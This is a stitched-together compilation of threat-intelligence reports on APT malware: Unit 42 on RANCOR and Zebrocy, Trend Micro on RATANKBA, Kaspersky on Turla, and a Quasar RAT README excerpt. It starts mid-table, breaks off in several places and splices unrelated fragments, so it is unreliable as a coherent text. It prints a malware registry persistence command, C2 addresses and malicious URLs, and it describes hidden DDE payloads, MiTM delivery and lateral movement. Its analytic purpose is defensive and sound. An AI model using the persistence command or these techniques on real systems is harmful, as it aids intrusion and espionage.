AudioRecorder 07 08 le64.dll le32.dll Open source-based LAME mp3 encoder (\u201cMar 27 2014\u201d) used by AudioRecorder plugins (adXX.dll) 09 dd.m MP3 file is sent by AudioRecorder (adXX.dll) when cache is cleared 10 11 me64.dll me32.dll AudioRecorder for Windows Metro applications 12 ma32.dll AudioRecorder for Windows COM Hooks IAudioClient, IAudioRenderClient, IMMDevice 15 16 ex64.dll ex32.dll Orchestrator Update/install/uninstall, selects target processes and loads plugins 17 18 fe64.dll fe32.dll Template of \u201cYokohama\u201d Frontend module;

2019", "Article Content Throughout 2017 and 2018 Unit 42 has been tracking and observing a series of highly targeted attacks focused in South East Asia, building on our research into the KHRAT Trojan Based on the evidence, these attacks appear to be conducted by the same set of attackers using previously unknown malware families In addition, these attacks appear to be highly targeted in their distribution of the malware used, as well as the targets chosen Based on these factors, Unit 42 believes the attackers behind these attacks are conducting their campaigns for espionage purposes We believe this group is previously unidentified and therefore have we have dubbed it \u201cRANCOR\u201d The Rancor group\u2019s attacks use two primary malware families which we describe in depth later in this blog and are naming DDKONG and PLAINTEE DDKONG is used throughout the campaign and PLAINTEE appears to be new addition to these attackers\u2019 toolkit.\u00a0 Countries Unit 42 has identified as targeted by Rancor with these malware families include, but are not limited to:  Singapore Cambodia  We identified decoy files which indicate these attacks began with spear phishing messages but have not observed the actual messages These decoys contain details from public news articles focused primarily on political news and events Based on this, we believe the Rancor attackers were targeting political entities.\u00a0 Additionally, these decoy documents are hosted on legitimate websites including a government website belonging to the Cambodia Government and in at least once case, Facebook The malware and infrastructure used in these attacks falls into two distinct clusters, which we are labeling A and B, that are linked through their use of the PLAINTEE malware and several \u201csofter\u201d linkages Linking the attacks Building on our previous research into KHRAT Trojan, we have been monitoring KHRAT command and control domains We made this IP the center of our investigation The following table depicts the two malware samples that are directly related to this IP address:    SHA256 Description Connection to IP \u00a0

Hosted on 89.46.222.97    \u00a0 Digging in further, the malware family we later named \u201cPLAINTEE\u201d appears to be quite unique with only six samples present in our data set Apart from one sample (c35609822e6239934606a99cb3dbc925f4768f0b0654d6a2adc35eca473c505d), we were able to link all PLAINTEE samples together by the infrastructure they use Figure 1 \u2013 Diagram showing the split of PLAINTEE samples across the two clusters of activity Our Investigation into both clusters further showed that they were both involved in attacks targeting organizations in South East Asia Based on the use of the relatively unique PLAINTEE malware, the malware\u2019s use of the same file paths on in each cluster, and the similar targeting, we have grouped these attacks together under the RANCOR campaign moniker Delivery & Loader mechanisms For many of the samples we\u2019ve been unable to identify how they were delivered to end victims; however, in three cases we were able to locate the files used to deliver the Trojan, which we found merited more investigation and are briefly discussed below Figure 3 \u2013 The decoy image loaded when the .HTA file is executed The decoy in Figure 3 strongly suggests the attackers were conducting an attack against a political entity in Cambodia The Cambodia National Rescue Party is a politically motivated opposition movement Case 3: Delivery via DLL Loader \u2013 0bb20a9570a9b1e3a72203951268ffe83af6dcae7342a790fe195a2ef109d855 \u00a0We identified three unique DLL loaders during this analysis The loaders are extremely simple with a single exported function and are responsible for executing a single command In two of the three examples, the malware also downloads and opens a decoy PDF document hosted on a legitimate but compromised website The decoy documents seen in these cases were related to Cambodian news articles, an example is shown in Figure 4 below Figure 4 \u2013 1.pdf decoy delivered by downloader \u00a0 The decoy above discusses a recent event that took place against political party supporters in Cambodia, a similar theme to the decoy document observed in Figure 3 It is worth noting that the third DLL mentioned attempts to download the decoy document from a government website This same website was used previously in a KHRat campaign targeting Cambodian citizens Additionally, two of the three DLL loaders were found to be hosted on this same compromised website, implying that it was likely compromised again in early 2018 The filenames for these two DLL loaders are as follows:  Activity

and the present, while PLAINTEE is a newer addition with the earliest known sample being observed in October 2017 It\u2019s unclear if DDKONG is only used by one threat actor or more than one based on the data available In this section we\u2019ll go over the capabilities and operation of these malware families DDKONG For the analysis below, we used the following file: \u00a0    SHA256 119572fafe502907e1d036cdf76f62b0308b2676ebdfc3a51dbab614d92bc7d0   SHA1 25ba920cb440b4a1c127c8eb0fb23ee783c9e01a   MD5 6fa5bcedaf124cdaccfa5548eed7f4b0   Compile Time 2018-03-14 07:20:11 UTC   File Type PE32 executable (DLL) (GUI) Intel 80386, for MS Windows    Table 1 \u2013 DDKONG sample analyzed in full The malware in question is configured with the following three exported functions:  ServiceMain Rundll32Call DllEntryPoint  The ServiceMain exported function indicates that this DLL is expected to be loaded as a service The Rundll32Call exported function begins by creating a named event named \u2018RunOnce\u2019 This event ensures that only a single instance of DDKong is executed at a given time If this is the only instance of DDKong running at the time, the malware continues If it\u2019s not, it dies This ensures that only a single instance of DDKong is executed at a given time DDKong attempts to decode an embedded configuration using a single byte XOR key of 0xC3 Once decoded, the configuration contains the data shown in Figure 5 below Figure 5 \u2013 Decoded configuration with fields highlighted \u00a0 After this configuration is decoded and parsed, DDKONG proceeds to send a beacon to the configured remote server via a raw TCP connection The packet has a header of length 32 and an optional payload In the beacon, no payload is provided, and as such, the length of this packet is set to zero Figure 6 \u2013 DDKONG beacon to remote C2 \u00a0 After it sends the beacon, the malware expects a response command of either 0x4 or 0x6 In the event 0x4 is specified, the malware is instructed to load the exported \u2018InitAction\u2019 function If 0x6 is specified, the malware is instructed to load the exported \u2018KernelDllCmdAction\u2019 function Prior to downloading the plugin, the malware downloads a buffer that is concatenated with the embedded configuration and ultimately provided to the plugin at runtime [TRUNCATED] 00000200: 00 00 00 00 00 00 00 00\u00a0 00 40 00 00 F0 97 B5 01\u00a0 \u2026\u2026\u2026@\u2026\u2026 \u00a0 As we can see in the above text, two full file paths are included in this buffer, providing us with insight into the original malware family\u2019s name, as well as the author After this buffer is collected, the malware downloads the plugin and loads the appropriate function During runtime, the following plugin was identified: \u00a0    SHA256 0517b62233c9574cb24b78fb533f6e92d35bc6451770f9f6001487ff9c154ad7   SHA1 03defdda9397e7536cf39951246483a0339ccd35   MD5 a5164c686c405734b7362bc6b02488cb   Compile Time

communications For this walk through, we use the following sample:    SHA256 c35609822e6239934606a99cb3dbc925f4768f0b0654d6a2adc35eca473c505d   SHA1 0bdb44255e9472d80ee0197d0bfad7d8eb4a18e9   MD5

sample is configured with three exported functions:  Add Sub DllEntryPoint  The DLL expects the export named \u2018Add\u2019 to be used when initially loaded When this function is executed PLAINTEE executes the following command in a new process to add persistence:       cmd.exe /c reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\" /v \"Microsoft Audio\" /t REG_SZ /d \"%APPDATA%\\NetworkService.exe\" \"[path_to_PLAINTEE]\",Add /freg add\"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\ CurrentVersion\\RunOnce\" /v\"Microsoft Audio\" /t REG_SZ /d \"%APPDATA%\\Network Service.exe\"\"[path_to_PLAINTEE]\",Add /f     Next, the malware calls the \u2018Sub\u2019 function which begins by spawning a mutex named \u2018microsoftfuckedupb\u2019 to ensure only a single instance is running at a given time In addition, PLAINTEE will create a unique GUID via a call to CoCreateGuid() to be used as an identifier for the victim The malware then proceeds to collect general system enumeration data about the infected machine and enters a loop where it will decode an embedded config blob and send an initial beacon to the C2 server The first byte of the string is used as the XOR key to in turn decode the remainder of the data Decoding this blob yields the following information, also found within the original binary: \u00a0    Offset Description   0x4 C2 port (0x1f99 \u2013 8089)   0x8 C2 host (45.76.176[.]236)   0x10C Flag used to identify the malware in network communications (default flag:4/2/2018 1:01:33 AM)    Table 4 \u2013 Configuration stored in the malware The malware then proceeds to beacon to the configured port via a custom UDP protocol The network traffic is encoded in a similar fashion, with a random byte being selected as the first byte, which is then used to decode the remainder of the packet via XOR.\u00a0 An example of the decoded beacon is show in Figure 7 Figure 7 PLAINTEE example beacon \u00a0 The structure for this beacon is given in Table 5 This beacon is continuously sent out until a valid response is obtained from the C2 server (there is no sleep timer set) After the initial beacon, there is a two second delay in between all other requests made This response is expected to have a return command of 0x66660002 and to contain the same GUID that was sent to the C2 server Once this response is received, the malware spawns several new threads, with different Command parameters, with the overall objective of loading and executing a new plugin that is to be received from the C2 server The retrieved plugin was as follows:    SHA256 b099c31515947f0e86eed0c26c76805b13ca2d47ecbdb61fd07917732e38ae78   SHA1 ac3f20ddc2567af0b050c672ecd59dddab1fe55e   MD5 7c65565dcf5b40bd8358472d032bc8fb   Compile Time

DLL with an export function of either \u2018shell\u2019 or \u2018file\u2019 As automated commands are typically performed more quickly this indicates that they may have been sent manually by the attacker Conclusions The RANCOR campaign represents a continued trend of targeted attacks against entities within the South East Asia region In a number of instances, politically motivated lures were used to entice victims into opening and subsequently loading previously undocumented malware families These families made use of custom network communication to load and execute various plugins hosted by the attackers Notably the PLAINTEE malwares\u2019 use of a custom UDP protocol is rare and worth considering when building heuristics detections for unknown malware Palo Alto Networks will continue to monitor these actors, their malware, and their infrastructure going forward Palo Alto Networks customers are protected against the threats discussed in this blog in the following ways:  Wildfire correctly identifies all samples discussed as malicious Traps appropriately blocks the malware from executing AutoFocus customers may track this threat via the KHRAT, DDKONG, PLAINTEE, and RANCOR tags

Large-scale Watering Holes against Enterprises", "Retrieved May 07, 2019.\nTrend Micro", "February 27, 2017", "RATANKBA: Delving into Large-scale Watering Holes against Enterprises", "Retrieved May 07, 2019", "Article Content In early February, several financial organizations reported malware infection on their workstations, apparently coming from legitimate websites The attacks turned out to be part of a large-scale campaign to compromise trusted websites in order to infect the systems of targeted enterprises across various industries The strategy is typically known as a \u201cwatering hole\u201d attack It was all sparked by a spate of recent malware attacks on Polish banks entailing a reportedly unknown malware in their own terminals and servers, along with the presence of dubious, encrypted programs/executables, and more prominently, suspicious network activity More malware are delivered to the affected systems which were seen connecting to unusual and far-flung locations worldwide, possibly where company data are exfiltrated to The malware in question: RATANKBA Not only was it tied to malware attacks against banks in Poland, but also in a string of similar incidents involving financial institutions in Mexico, Uruguay, the United Kingdom, and Chile How did it infect their victims? Were there other malware involved? Does the campaign really have ties with a Russian cybercriminal group? Based on the odd wording choices (in Russian) we saw used as commands within the malware, we construe that it is just a decoy\u2014a tactic to obfuscate the attackers\u2019 trails Banks weren\u2019t the only targets; among them are also enterprises in telecommunications, management consulting, information technology, insurance, aviation, and education Also, the campaign wasn\u2019t just confined to North America and Europe, as we also observed a number of affected organizations in the APAC region, notably Taiwan, Hong Kong, and China Here we provide further analysis and insights that can complement other ongoing research into this threat Figure 1 One of the possible infection flows involving RATANKBA Infection Flow The campaign, like what we saw in affected Polish banks, has many attack chains The tools and techniques employed are typical in targeted attacks due to elements of lateral movement and reconnaissance These websites were injected with malicious JavaScript code that fingerprints browser components and loads vulnerability exploits from their malware and exploit kit-hosting systems, some of which were also likely compromised The infection is multistage and involves a variety of malware, with the final payload delivered only to their targets of interest Different command and control (C&C) servers were used Some were also compromised machines that proxied connections to the attackers\u2019 infrastructure The domain also serves as one of the campaign\u2019s platform for C&C communication The threat actor uses RATANKBA to survey the lay of the land as it looks into various aspects of the host machine where it has been initially downloaded\u2014the machine that has been victim of the watering hole attack Information such as the running tasks, domain, shares, user information, if the host has default internet connectivity, and so forth Figure 2 RATANKBA looking at different aspects of the machine It would be worthwhile to note that RATANKBA has also been seen looking at specific IP ranges of interest:  Figure 3 Figure 4 Commandline instructions of the hack tool Upon successful connection, this hack tool will try to copy the calc.exe of the attacker\u2019s machine to the targeted computer\u2019s network share (C$) to test if file propagation via network share is successful and would most likely succeed if the credentials used would have administrative privileges A log of it is then dumped to the directory where the file was initially executed With the combination of the information from RATANKBA and success/failure results from HKTL_NBTSCAN, the threat actor is now free to deploy final payloads to interesting hosts A banking Trojan (TSPY_BANKER.NTE) is among RATANKBA\u2019s final payloads Some of the compromised sites used by attacker host several malware and suspicious/malicious files include:  An information-stealing backdoor (detected by Trend Micro as BKDR_DESTOVER.ADU), A similarly named Flash file (swf, detected as SWF_EXPLOYT.YYRQ) A Silverlight (.xap) file containing several files: an App Manifest (AppManifest.xaml), and DLLs Shell_siver.dll (TROJ_CVE20130074.B), and System.Xml.Linq.dll, which when repacked form a runtime remote code execution exploit for Silverlight (CVE-2016-0034, patched last January 12, 2016) A Trojan (TROJ64_KLIPODLDR.ZHEB-A) that drops an encrypted module (BKDR64_KLIPODENC.ZHEB-A) containing a banking spyware (TSPY64_BANKER.YWNQD), used as a Windows service persistence mechanism DLL Impact There were actually more victims than what was initially gauged Feedback from our Smart Protection Network\u2122 revealed that apart from attacks in North America (mainly the U.S.), Europe, and South America, the campaign also noticeably affected enterprises in Taiwan, Hong Kong, China, and Bahrain Affected organizations also included those in Luxembourg, France, the Philippines, Japan, Spain, Malaysia, Norway, and Romania The targeted industries were consistent with other analyses: telecommunications (including internet service providers) and banking We also saw a miscellany of targets whose industries comprise internet-related services (such as data center operations), management consulting, information technology, pharmaceutics, insurance, even aviation and education In the case of Taiwan, we\u2019ve seen the compromised website diverting its visitors to another malware-hosting site that also acts as platform for C&C communication: sap[.]misapor[.]ch We saw the affected websites of financial institutions in Uruguay and Mexico redirecting victims to the same URL While the URL acts similarly to how eye-watch[.]in:443 delivers payloads, we also saw the URL leveraging and exploiting security flaws in Flash: CVE-2015-8651, CVE-2016-1019, and CVE-2016-4117 Figure 5 Screenshot of the malware\u2019s code showing commands in Russian A False Flag? The campaign notably bears similarities with activities that seem to point the finger to Russian perpetrators Is there really a Russian connection? Delving into the malware, we found that it indeed uses commands in Russian\u2014transliterated from Cyrillic script to Latin alphabet, in particular The verbs used were in their infinitive form, however, which is awkward for a command switch Case in point: the use of \u201custanavlivat\u201d (\u201cto install\u201d) instead of the more command-like \u201custanovit\u201d (\u201cdo install\u201d), which gives the impression that the malware operator lifted it from a dictionary or source where words are typically listed in default form Additionally, using verbs as commands is peculiar, especially for Russian cybercriminals or malware programmers who ironically eschew using Russian language in favor of broken English Majority\u2014if not all\u2014of Russian programmers know that \u201cconnect\u201d is keyed in as \u201cconnect\u201d, because there\u2019s already an API call (Application Program Interface) under that name If you really have to use Russian, you\u2019d rather use words like \u201cvykhod\u201d (\u201cquit\u201d) than \u201cvikhodit\u201d (\u201cto exit\u201d) Another example is the use of \u201cklyent2podklychit\u201d we found within the sample we analyzed The only intelligible part of it was \u201c2\u201d, which can be taken as \u201cto\u201d given how there\u2019s an API call name for it (client2connect) In Russian, it\u2019s practically gibberish, with the words wrongly ordered; it makes much more sense if \u201cpodkluchit_klienta\u201d was used instead Indeed, with the awkward use of Russian language within the malware, we\u2019re inclined to surmise it as more of a false flag, intentionally inserted in the code to flummox threat research and attribution attempts It\u2019s an uncommon tactic, but one that\u2019s already been observed in other malware and cyberattacks Were the attacks carried out by cybercriminal group Lazarus? While there is ambivalence if they were indeed their handiwork, our analysis indicates that the malware codes and techniques employed resembled those used by Lazarus Malicious web injections, for instance, leverage exploits that enable attackers to gain footholds into the system An organization\u2019s best defense is to regularly apply the latest patches, as well as routinely scan and examine traffic that goes through the enterprise\u2019s network, which enables prompt incident response and remediation Hardening the endpoints is critical, as bad guys can use these to enter the company network Implementing the apt restrictions/permissions policies on end user systems and employing application control can help prevent unwanted and suspicious applications and processes from being executed Disabling unnecessary\u2014or unused\u2014components in the system such as third-party plugins and extensions helps reduce the system\u2019s attack surface Employing firewalls and intrusion detection systems on top of proactive network monitoring can help mitigate incursions into the organization End users can help by practicing and fostering security habits, such as prudence against dubious and socially engineered links, emails, and websites Updated on February 27, 2017, 5:55 PM (UTC-7): We updated the wording that cited affected organizations in several countries Updated on February 27, 2017, 11:08 PM (UTC-7): We updated the section of the article\u00a0that mentioned cybercriminal group Lazarus Updated on March 1, 2017, 09:15 PM (UTC-7): An updated version of the appendix containing Indicators of Compromise (IoCs) and other technical details has been uploaded Post from: Trendlabs Security Intelligence Blog - by Trend Micro RATANKBA: Delving into Large-scale Watering Holes against Enterprises", "MaxXor", "April 03, 2019", "Remote Administration Tool for Windows", "Retrieved May 07, 2019.\nMaxXor", "April 03, 2019", "Remote Administration Tool for Windows", "Retrieved May 07, 2019", "Article Content Free, Open-Source Remote Administration Tool for Windows Quasar is a fast and light-weight remote administration tool coded in C# The usage ranges from user support through day-to-day administrative work to employee monitoring Providing high stability and an easy-to-use user interface, Quasar is the perfect remote administration solution for you Once all packages are installed the project can be compiled as usual by clicking Build on the top or by pressing F6 See below which build configuration to choose from You can execute the client directly with the specified settings Release configuration Live use Start Quasar.exe and use the client builder Contributing See CONTRIBUTING.md Roadmap See ROADMAP.md License Quasar is distributed under the MIT License Third-party licenses are located here Thank you!

Uroboros, may be best known for what was at the time an \u201cultra complex\u201d snake rootkit focused on NATO-related targets, but their malware set and activity is much broader Our current focus is on more recent and upcoming activity from this APT, which brings an interesting mix of old code, new code, and new speculations as to where they will strike next and what they will shed Much of our 2018 research focused on Turla\u2019s KopiLuwak javascript backdoor, new variants of the Carbon framework and meterpreter delivery techniques Also interesting was Mosquito\u2019s changing delivery techniques, customized PoshSec-Mod open-source powershell use, and borrowed injector code We tied some of this activity together with infrastructure and data points from WhiteBear and Mosquito infrastructure and activity in 2017 and 2018 For a first, our KopiLuwak research identified targets and delivery techniques, bringing more accuracy and reliability to the discussion Also interesting is a review of Turla scripting artefacts leading to newer efforts like KopiLuwak, tracing from older scripting in development efforts in WhiteAtlas and WhiteBear And, we find 2018 KopiLuwak delivery techniques that unexpectedly matched Zebrocy spearphishing techniques for a first time as well Also highly interesting and unusual was the MiTM techniques delivering Mosquito backdoors In all likelihood, Turla delivered a physical presence of some sort within Wifi range of targets Download sessions with Adobe\u2019s website were intercepted and injected to deliver Mosquito trojanized installers This sort of hypothesis is supported by Mosquito installers\u2019 consistent wifi credential theft We expect to see more Mosquito activity into 2019 And finally, we discuss the Carbon framework, tying together the older, elegant, and functional codebase sometimes called \u201cSnake lite\u201d with ongoing efforts to selectively monitor high value targets It appears that the backdoor is pushed with meterpreter now And, as we see code modifications and deployment in 2018, we predict more development work on this matured codebase along with selective deployment to continue into 2019 IcedCoffee Turla\u2019s first foray into full-fledged Javascript backdoors began with the usage of the IcedCoffee backdoor that we reported on in our private June 2016 \u201cIce Turla\u201d report (available to customers of Kaspersky APT Intelligence Services), which led later to their more fully functional and complex, recently deployed, KopiLuwak backdoor IcedCoffee was initially dropped by exploit-laden RTF documents, then later by macro-enabled Office documents The macro code used to drop IcedCoffee was a slightly modified version of that found in White Atlas, which is consistent with the code sharing present in many Turla tools A noteworthy change to the macro code was the addition of a simple web beacon that relayed basic information to Turla controlled servers upon execution of the macro, which not only helped profile the victim but also could be used to track the effectiveness of the attack IcedCoffee has no built-in command capability, instead it may receive javascript files from the C2 server, which are deobfuscated and executed in memory, leaving nothing behind on disk for forensic analysis IcedCoffee was not widely deployed, rather it was targeted at diplomats, including Ambassadors, of European governments The targeting for this new malware was consistent with earlier Turla operations, focusing on European governments, but it was even more selectively deployed than IcedCoffee The KopiLuwak script is decoded by macro code very similar to that previously seen with IcedCoffee, but the resulting script is not the final step This script is executed with a parameter used as a key to RC4 decrypt an additional layer of javascript that contains the system information collection and command and control beaconing functionality KopiLuwak performs a more comprehensive system and network reconnaissance collection, and like IcedCoffee leaves very little on disk for investigators to discover other than the base script Unlike IcedCoffee, KopiLuwak contains a basic set of command functionality, including the ability to run arbitrary system commands and uninstall itself In mid-2017 a new version was discovered in which this command set had been further enhanced to include file download and data exfiltration capabilities The most recent evolution in the KopiLuwak life cycle was observed in mid-2018 when we observed a very small set of systems in Syria and Afghanistan being targeted with a new delivery vector Carbon \u2013 the long tail Carbon continues to be deployed against government and foreign affairs related organizations in Central Asia Carbon targeting in this region has shifted across a few countries since 2014 Here, we find a new orchestrator v3.8.2 and a new injected transport library v4.0.8 deployed to multiple systems And while we cannot identify a concrete delivery event for the dropper, its appearance coincides with the presence of meterpreter This meterpreter reliance also coincides with wider Turla use of open source tools that we documented towards the end of 2017 and beginning of 2018 The Epic Turla operation reported in 2014 involved highly selective Carbon delivery and was a long term global operation that affected hundreds of victims Only a small portion of these systems were upgraded to a malware set known as \u201cthe Carbon framework\u201d, and even fewer received the Snake rootkit for \u201cextreme persistence\u201d So, Carbon is known to be a sophisticated codebase with a long history and very selective delivery, and coincides with Snake rootkit development and deployment In light of its age, it\u2019s interesting that this codebase is currently being modified, with additional variants deployed to targets in 2018 We expect Carbon framework code modifications and predict selective deployment of this matured codebase to continue into 2019 within Central Asia and related remote locations A complex module like this one must require some effort and investment, and while corresponding loader/injector and lateral movement malware moves to open source, this backdoor package and its infrastructure is likely not going to be replaced altogether in the short term .JS attachments deliver Skipper/WhiteAtlas and WhiteBear We introduced WhiteBear actionable data to our private customers early 2017, and similar analysis to that report was publicly shared eight months later Again, it was a cluster of activity that continued to grow past expectations It is interesting because WhiteBear shared known compromised infrastructure with KopiLuwak: soligro[.]com WhiteBear scripted spearphish attachments also follows up on initial WhiteAtlas scripting development and deployment efforts Mosquito\u2019s Changing 2018 Delivery Techniques In March 2018, our private report customers received actionable data on Mosquito\u2019s inclusion of fileless and customized Posh-SecMod metasploit components When discussion of the group\u2019s metasploit use was made public, their tactics began to change The \u201cDllForUserFileLessInstaller\u201d injector module maintained a compilation date of November 22, 2017, and was starting to be used by Mosquito to inject ComRAT modules into memory around January 2018 It is a small piece of metasploit injector code that accounts for issues with Wow64 Also, related open source powershell registry loader code oddly was modified to avoid AES use, and opt for 3DES encryption instead Here is the modified Mosquito code:  And here is the default Posh-SecMod code that they ripped from:  We expect to see more open-source based or inspired fileless components and memory loaders from Mosquito throughout 2018 Perhaps this malware enhancement indicates that they are more interested in maintaining current access to victim organizations than developing offensive technologies MiTM and Ducking the Mosquito Net We delivered actionable data on Mosquito to our private intel customers in early 2017 Our initial findings included data around an unusual and legitimate download URL for trojanized installers: hxxp://admdownload.adobe[.]com/bin/live/flashplayer23ax_ra_install.exe While we could not identify the MiTM techniques with accuracy at the time, it is possible either WiFi MiTM or router compromise was used in relation to these incidents It is unlikely, but possible, that ISP-level FinFisher MiTM was used, considering multiple remote locations across the globe were targeted But there is more incident data that should be elaborated on In some cases, two \u201c.js\u201d files were written to disk and the infected system configured to run them at startup Their naming provides insight into the intention of this functionality, which is to keep the malware remotely updated via google application, and maintain local settings updates by loading and running \u201c1.txt\u201d at every startup In a way, this staged script loading technique seems to be shared with the IcedCoffee javascript loading techniques observed in past Turla incidents focused on European government organizations Updates are provided from the server-side, leading to fewer malware set findings google_update_checker.js local_update_checker.js  So, we should consider the wifi data collection that Mosquito Turla performed during these updates, as it hasn\u2019t been documented publicly Maintaining ongoing host-based collection of wifi credentials for target networks makes it far easier to possess ongoing access to wifi networks for spoofing and MiTM, as brute-forcing or otherwise cracking weakly secured WiFi networks becomes unnecessary Perhaps this particular method of location-dependent intrusion and access is on the decline for Mosquito Turla, as we haven\u2019t identified new URLs delivering trojanized code The Next Strike It\u2019s very interesting to see ongoing targeting overlap, or the lack of overlap, with other APT activity Noting that Turla was absent from the milestone DNC hack event where Sofacy and CozyDuke were both present, but Turla was quietly active around the globe on other projects, provides some insight as to ongoing motivations and ambitions of this group It is interesting that data related to these organizations has not been weaponized and found online while this Turla activity quietly carries on Both Turla\u2019s Mosquito and Carbon projects focus mainly on diplomatic and foreign affairs targets While WhiteAtlas and WhiteBear activity stretched across the globe to include foreign affairs related organizations, not all targeting consistently followed this profile Scientific and technical centers were also targeted, and organizations outside of the political arena came under focus as well Turla\u2019s KopiLuwak activity does not necessarily focus on diplomatic/foreign affairs, and also winds down a different path Instead, 2018 activity targeted government related scientific and energy research organizations, and a government related communications organization in Afghanistan This highly selective but wider targeting set most likely will continue into 2019 From the targeting perspective, we see closer ties between the KopiLuwak and WhiteBear activity, and closer alignments between Mosquito and Carbon activity And WhiteBear and KopiLuwak shared infrastructure while deploying unusual .js scripting Perhaps open source offensive malware will become much more present in Mosquito and Carbon attacks as we see more meterpreter and injector code, and more uniquely innovative complex malware will continue to be distributed with KopiLuwak and a possible return of WhiteBear And as we see with borrowed techniques from the previous zebrocy spearphishing, techniques are sometimes passed around and duplicated KopiLuwak: A New

Attacks", "Retrieved May 07, 2019", "Article Content Summary The Sofacy group remains a persistent global threat Unit 42 and others have shown in the first half of 2018 how this threat actor group continues to target multiple organizations throughout the world with a strong emphasis on government, diplomatic and other strategic organizations primarily in North America and Europe Following up our most recent Sofacy research in February and March of 2018, we have found a new campaign that uses a lesser known tool widely attributed to the Sofacy group called Zebrocy This third campaign is consistent with two previously reported attack campaigns in terms of targeting: the targets were government organizations dealing with foreign affairs In this case however the targets were in different geopolitical regions An interesting difference we found in this newest campaign was that the attacks using Zebrocy cast a far wider net within the target organization: the attackers sent phishing emails to a an exponentially larger number of individuals The targeted individuals did not follow any significant pattern, and the email addresses were found easily using web search engines This is a stark contrast with other attacks commonly associated with the Sofacy group where generally no more than a handful of victims are targeted within a single organization in a focus-fire style of attack In addition to the large number of Zebrocy attacks we discovered, we also observed instances of the Sofacy group leveraging the Dynamic Data Exchange (DDE) exploit technique previously documented by McAfee The instances we observed, however, used the DDE exploit to deliver different payloads than what was observed previously In one instance the DDE attack was used to deliver and install Zebrocy In another instance, the DDE attack was used to deliver an open-source penetration testing toolkit called Koadic The Sofacy group has leveraged open source or freely available tools and exploits in the past but this is the first time that Unit 42 has observed them leveraging the Koadic toolkit Links to previous attacks In our February report, we discovered the Sofacy group using Microsoft Office documents with malicious macros to deliver the SofacyCarberp payload to multiple government entities In that report, we documented our observation that the Sofacy group appeared to use conventional obfuscation techniques to mask their infrastructure attribution by using random registrant and service provider information for each of their attacks In particular, we noted that the Sofacy group deployed a webpage on each of the domains This is odd because attackers almost never set up an actual webpage on adversary C2 infrastructure Even stranger, each webpage contained the same content within the body Since that report, we continued our research into this oddity Using this artifact, we were able to pivot and discover another attack campaign using the DealersChoice exploit kit with similar victimology to what we saw in February Continuing to use this artifact, we discovered another domain with the same content body, supservermgr[.]com This domain was registered on December 20, 2017 and within a few days was resolving to 92.222.136[.]105, which belonged to a well-known VPS provider often used by the Sofacy group Unfortunately, at the time of collection, the C2 domain had been sinkholed by a third party First, we determined the sample we collected, d697160ae\u2026 was attempting to communicate to its C2 at hxxp://supservermgr[.]com/sys/upd/pageupd.php to retrieve a Zebrocy AutoIT downloader Because the domain had been sinkholed, this activity could not be completed This led us to additional infrastructure for Zebrocy at 185.25.51[.]198 and 185.25.50[.]93 At this point we had collected nearly thirty samples of Zebrocy in relation to the original sample and its associated C2 domain Additional pivoting based on artifacts unique to this malware family expanded our dataset to hundreds of samples used over the last several years Most of the additional samples were the Delphi and AutoIT variants as reported by ESET However, several of the collected samples were a C++ variant of the\u00a0Zebrocy downloader tool In addition, we discovered evidence of a completely different payload in Koadic being delivered as well Also, we found the IP address 185.25.50[.]93 hosting C2 services for a Delphi backdoor that ESET\u2019s report states is the final stage payload for these attacks A Maltego chart diagramming the relational analysis we performed is below:  Figure 1 Visualization of relationships Please note this is not a comprehensive chart of all Zebrocy and Koadic samples we were able to collect Only samples mentioned or relevant to the relational analysis have been included Pivoting off of this artifact provided us additional Zebrocy samples A closer examination of the tool revealed the second user agent string was from a secondary payload that was retrieved by the cba5ab65a\u2026 sample Pivoting from the Mozilla v5.1 user agent revealed over forty additional Zebrocy samples, with several again targeting the same Central Asian nation Two samples specifically, 25f0d1cbc\u2026 and 115fd8c61\u2026 provided additional artifacts we were able to pivot from to discover weaponized documents to deliver Zebrocy as well as a Koadic Figure 2 Timeline of User Agents DDE Documents The two weaponized documents we discovered leveraging DDE were of particular interest due to victimology and a change in tactics While examining 25f0d1cbc\u2026, we were able to pivot from its C2 \u00a0220.158.216[.]127 to gather additional Zebrocy samples as well as a weaponized document This document (85da72c7d\u2026) appears to have been targeting a North American government organization dealing with foreign affairs It leveraged DDE to retrieve and install a payload onto the victim host A decoy document is deployed in this attack, with the contents purporting be a publicly available document from the United Nations regarding the Republic of Uzbekistan Figure 3 Example of delivery document  Figure 4 Lure image used The creator of the weaponized document appended their DDE instructions to the end of the document after all of the decoy contents When the document is opened in Word, the instructions are not immediately visible, as Word does not display these fields contents by default As you can see in the following screenshot, simply attempting to highlight the lines in which the DDE instructions reside does not display them Figure 5 Hidden DDE commands Enabling the \u201cToggle Field Codes\u201d feature reveals the DDE instructions to us and shows that the author had set instructions to size 1 font and with a white coloring The use of a white font coloring to hide contents within a weaponized document is a technique we had previously reported being used by the Sofacy group in a malicious macro attack The DDE instructions also included another command that it did not run, which suggests it is an artifact of a prior version of this delivery document 115fd8c61\u2026 was another Zebrocy sample we were able to pivot from by gathering additional samples connecting to its C2 86.106.131[.]177 The additional samples targeted the same large Central Asian nation state as previously mentioned but more interestingly, one of the samples was a weaponized document also leveraging DDE and containing a non-Zebrocy payload The payload turned out to be an open source penetration test toolkit called Koadic It is a toolkit similar to Metasploit or PowerShell Empire and is freely available to anyone on Github Conclusion The Sofacy group continues their targeted attack campaigns in 2018 As mentioned in this blog, Sofacy is carrying out parallel campaigns to attack similar targets around the world but with different toolsets The Zebrocy tool associated with this current strain of attacks is constructed in several different forms based on the programming language the developer chose to create the tool We have observed Delphi, AutoIt, and C++ variants of Zebrocy, all of which are related not only in their functionality, but also at times by chaining the variants together in a single attack These attacks are still largely perpetrated via spear phishing campaigns, whether via simple executable attachments in hopes that a victim will launch the file to using a previously observed DDE exploitation technique Palo Alto Networks customers are protected from Zebrocy and Koadic attacks by:  All known Zebrocy samples have a malicious verdict in WildFire AutoFocus customers can track this campaign with the following Tags:  Zebrocy Koadic    Appendix Zebrocy C++ Variant On February 19, 2018, we saw a spear phishing email sent to a foreign affairs organization within a Central Asian country, which attempted to delivered an attached Zebrocy downloader (5b5e80f63\u2026) written in the Delphi programming language This downloader obtained a second downloader, which in this case was very similar in functionality but was written in C++ instead of Delphi It then creates an invisible window (0x0 pixel) in the bottom right corner of the screen, which will call the main function of the Trojan It starts by calling this specific sub-function with an argument of 1 to get the IP address for the C2 to connect The main function then calls the subfunction with the argument 3 to get the POST data parameter (\u201cporg\u201d) along with the volume serial number and computer name and will send this data to the 